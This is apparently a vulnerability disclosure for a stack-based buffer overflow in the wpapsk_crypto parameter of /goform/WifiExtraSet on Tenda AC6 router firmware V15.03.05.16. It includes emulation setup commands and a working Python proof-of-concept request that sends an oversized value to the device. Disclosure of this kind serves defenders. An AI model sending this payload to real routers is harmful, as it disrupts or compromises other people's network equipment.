/goform/WifiExtraSet
--------------------

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![](api/attachments/OLpMhoNjD8Vg/image/image.png)

### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

### Vulnerability details

A vulnerability was found in Tenda AC6 V15.03.05.16. The file /goform/WifiExtraSet is affected. Using the wpapsk\_crypto parameter causes a stack-based buffer overflow

![](api/attachments/RDjZlle9Z1rD/image/image.png)

### poc

```text-plain
import requests

url = "http://192.168.142.100/goform/WifiExtraSet"
data = {
    "wifi_chkHz": "1",
    "wl_mode": "wisp",
    "wl_enbale": "1",
    "country_code": "CN",
    "wpsEn": "0",
    "guestEn": "0",
    "iptvEn": "0",
    "wifiTimerEn": "1",
    "smartSaveEn": "1",
    "dmzEn": "1",
    "handset": "0",
    "ssid": "fcniux",
    "wpapsk_key": "11111111",
    "security": "wpapsk",
    "wpapsk_type": "wpa",
    "wpapsk_crypto": b"Raining" * 28, 
    "mac": "undifined"
}

response = requests.post(url, data=data)
print(response.status_code)
print(response.text)
```

![](api/attachments/PeiIIoXkyBHq/image/image.png)
